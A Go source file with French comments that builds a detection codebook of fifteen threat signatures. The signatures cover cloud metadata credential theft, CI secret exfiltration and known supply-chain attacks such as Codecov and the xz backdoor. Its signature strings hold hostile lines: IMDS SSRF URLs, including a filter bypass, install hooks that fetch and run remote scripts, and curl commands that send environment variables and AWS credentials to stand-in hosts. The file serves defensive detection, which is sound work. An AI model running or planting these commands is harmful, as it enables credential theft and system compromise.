package engine

import "fmt"

// Motifs croisés 05 : catalogue de signatures croisant la stack cloud-native,
// les métadonnées d'instance (IMDS), les coffres de secrets (Vault) et les
// chaînes d'intégration continue. Chaque définition porte une fenêtre canonique
// de 96 octets, le sous-système et la sévérité. L'encodage RaBitQ 512D réemploie
// FeatureExtractor.ExtractTo puis Encode512, sans nouvelle voie de calcul.
//
// Les dix premiers motifs (ThreatID 0x0501..0x050A) sont des signatures de code
// vulnérable construites pour la détection. Les cinq suivants (ThreatID
// 0x05B1..0x05B5) sont des observables reconstruits d'attaques supply-chain
// authentiques, dont la provenance est citée dans le workfile
// /devhoros/c2blue55-motifs-croises-05.work. Aucune charge réelle n'est
// revendiquée.

// Sous-systèmes et actions repris du vocabulaire canonique de c2blue55.go. Le
// paquet engine étant interne et sans dépendance vers son parent, les valeurs
// sont redéclarées ici pour éviter tout cycle d'import.
const (
	motifSubProc    uint16 = 1
	motifSubFile    uint16 = 2
	motifSubNet     uint16 = 3
	motifActExec    uint16 = 1
	motifActConnect uint16 = 3
	motifActRead    uint16 = 5
)

// MotifDef décrit une entrée du catalogue avant encodage. La fenêtre est
// copiée dans Probe_event_t.Payload, tronquée à 96 octets.
type MotifDef struct {
	ThreatID  uint32
	Name      string
	Source    string
	Subsystem uint16
	Action    uint16
	Severity  uint16
	Window    [FeaturePayloadBytes]byte
}

// motifWindow construit une fenêtre de 96 octets terminée par des NUL, la
// convention de troncature de l'extracteur s'arrêtant au premier octet NUL.
// Une chaîne de plus de 96 octets est refusée à la construction.
func motifWindow(s string) ([FeaturePayloadBytes]byte, int, error) {
	var w [FeaturePayloadBytes]byte
	if len(s) > FeaturePayloadBytes {
		return w, 0, fmt.Errorf("c2book motif: fenêtre de %d octets > %d", len(s), FeaturePayloadBytes)
	}
	copy(w[:], s)
	return w, len(s), nil
}

// mustMotifWindow est la variante de construction du catalogue, dont toutes les
// fenêtres sont des constantes vérifiées au chargement du paquet.
func mustMotifWindow(s string) [FeaturePayloadBytes]byte {
	w, _, err := motifWindow(s)
	if err != nil {
		panic(err)
	}
	return w
}

// MotifsCroises05 rend le catalogue complet des quinze motifs. L'ordre est
// stable : motifs de code vulnérable, puis traces authentiques.
func MotifsCroises05() []MotifDef {
	return []MotifDef{
		{
			ThreatID:  0x0501,
			Name:      "ssrf-imdsv1-role-credentials",
			Source:    "AWS IMDSv1; SSRF direct",
			Subsystem: motifSubNet,
			Action:    motifActConnect,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("GET http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"),
		},
		{
			ThreatID:  0x0502,
			Name:      "gcp-metadata-service-account-token",
			Source:    "GCP metadata server v1",
			Subsystem: motifSubNet,
			Action:    motifActConnect,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("GET /computeMetadata/v1/instance/service-accounts/default/token Metadata-Flavor:Google"),
		},
		{
			ThreatID:  0x0503,
			Name:      "imds-url-filter-bypass-ipv6-decimal",
			Source:    "Contournement par adresse littérale",
			Subsystem: motifSubNet,
			Action:    motifActConnect,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("GET http://[::ffff:a9fe:a9fe]/latest/meta-data/ HTTP/1.1 Host: 2852039166"),
		},
		{
			ThreatID:  0x0504,
			Name:      "npm-postinstall-ci-secret-exfil",
			Source:    "Crochet de cycle de vie npm",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("\"postinstall\":\"node ./scripts/collect.js\" process.env.GITHUB_TOKEN VAULT_TOKEN"),
		},
		{
			ThreatID:  0x0505,
			Name:      "github-actions-pull-request-target-injection",
			Source:    "Workflow pull_request_target",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("run: echo '${{ github.event.pull_request.title }}' >> $GITHUB_STEP_SUMMARY"),
		},
		{
			ThreatID:  0x0506,
			Name:      "vault-prod-secret-read-from-ci",
			Source:    "HashiCorp Vault API v1",
			Subsystem: motifSubNet,
			Action:    motifActConnect,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("GET /v1/secret/data/prod X-Vault-Token: hvs.CAESIJ..."),
		},
		{
			ThreatID:  0x0507,
			Name:      "aws-credentials-read-then-post",
			Source:    "Moisson d'identifiants persistants",
			Subsystem: motifSubFile,
			Action:    motifActRead,
			Severity:  SeverityHigh,
			Window:    mustMotifWindow("open ~/.aws/credentials aws_secret_access_key= POST https://collector.example.net/"),
		},
		{
			ThreatID:  0x0508,
			Name:      "setup-py-install-hook-command",
			Source:    "Crochet d'installation Python",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("setup.py install_requires os.system(\"curl -s http://pypi-cdn.example/install.sh | sh\")"),
		},
		{
			ThreatID:  0x0509,
			Name:      "gradle-prebuild-exec-env-exfil",
			Source:    "Tâche Exec de plugin tiers",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityHigh,
			Window:    mustMotifWindow("task exfil(type:Exec){commandLine 'bash','-c','env | curl -d @- http://10.0.0.9'}"),
		},
		{
			ThreatID:  0x050A,
			Name:      "azure-imds-managed-identity-token",
			Source:    "Azure Instance Metadata Service",
			Subsystem: motifSubNet,
			Action:    motifActConnect,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("GET /metadata/identity/oauth2/token?api-version=2018-02-01 Metadata:true"),
		},
		{
			ThreatID:  0x05B1,
			Name:      "solarwinds-sunburst-orion-dll",
			Source:    "CISA AA20-352A",
			Subsystem: motifSubNet,
			Action:    motifActConnect,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("avsvmcloud.com C2 solarwinds.orion.core.businesslayer.dll signed build injection"),
		},
		{
			ThreatID:  0x05B2,
			Name:      "codecov-bash-uploader",
			Source:    "Codecov post-mortem 2021-04",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("bash <(curl -s https://codecov.io/bash) env | curl -X POST https://codecov.io"),
		},
		{
			ThreatID:  0x05B3,
			Name:      "npm-event-stream-flatmap-stream",
			Source:    "GHSA-mh6f-8j2x-4483",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("event-stream@3.3.6 flatmap-stream decrypt copay.min.js credential theft"),
		},
		{
			ThreatID:  0x05B4,
			Name:      "npm-ua-parser-js-malicious-versions",
			Source:    "GHSA-pjwm-rvh2-c87w / CVE-2021-4229",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("ua-parser-js@0.7.29 postinstall preinstall cryptominer password stealer"),
		},
		{
			ThreatID:  0x05B5,
			Name:      "xz-liblzma-build-to-host-backdoor",
			Source:    "oss-security 2024-03-29 / CVE-2024-3094",
			Subsystem: motifSubProc,
			Action:    motifActExec,
			Severity:  SeverityCritical,
			Window:    mustMotifWindow("build-to-host.m4 sed rpath | xz -d | bash bad-3-corrupt_lzma2.xz configure"),
		},
	}
}

// EncodeMotif encode une définition en CodebookEntry par la voie réelle du
// moteur : construction d'un Probe_event_t portant la fenêtre et les
// métadonnées, projection 512D centrée, puis quantification 1-bit RaBitQ.
// Les normes L2² et L1 sont rendues pour la correction asymétrique.
func EncodeMotif(m *MotifDef) (CodebookEntry, float64, float64, error) {
	var entry CodebookEntry
	if m == nil {
		return entry, 0, 0, fmt.Errorf("c2book motif: définition nulle")
	}
	if m.ThreatID == 0 {
		return entry, 0, 0, fmt.Errorf("c2book motif: identifiant de menace nul")
	}

	ev := Event{
		Ts_ns:     uint64(m.ThreatID),
		Subsystem: m.Subsystem,
		Action:    m.Action,
	}
	copy(ev.Payload[:], m.Window[:])

	fe := NewFeatureExtractor()
	var vec [EmbeddingDim]float32
	if !fe.ExtractTo(&ev, vec[:]) {
		return entry, 0, 0, fmt.Errorf("c2book motif: extraction refusée")
	}

	entry.ThreatID = m.ThreatID
	entry.Subsystem = m.Subsystem
	entry.Severity = m.Severity
	sqNorm, l1Norm := Encode512(vec[:], &entry.Bitcode)
	return entry, sqNorm, l1Norm, nil
}

// BuildMotifsCroises05Codebook encode le catalogue complet et rend un codebook
// contigu, prêt pour la recherche par distance de Hamming.
func BuildMotifsCroises05Codebook() (*Codebook, error) {
	defs := MotifsCroises05()
	entries := make([]CodebookEntry, 0, len(defs))
	for i := range defs {
		entry, _, _, err := EncodeMotif(&defs[i])
		if err != nil {
			return nil, err
		}
		entries = append(entries, entry)
	}
	return NewCodebook(entries), nil
}

// SaveMotifsCroises05Codebook écrit le catalogue encodé au format .c2book.
func SaveMotifsCroises05Codebook(path string) error {
	cb, err := BuildMotifsCroises05Codebook()
	if err != nil {
		return err
	}
	return SaveCodebook(path, cb.entries)
}
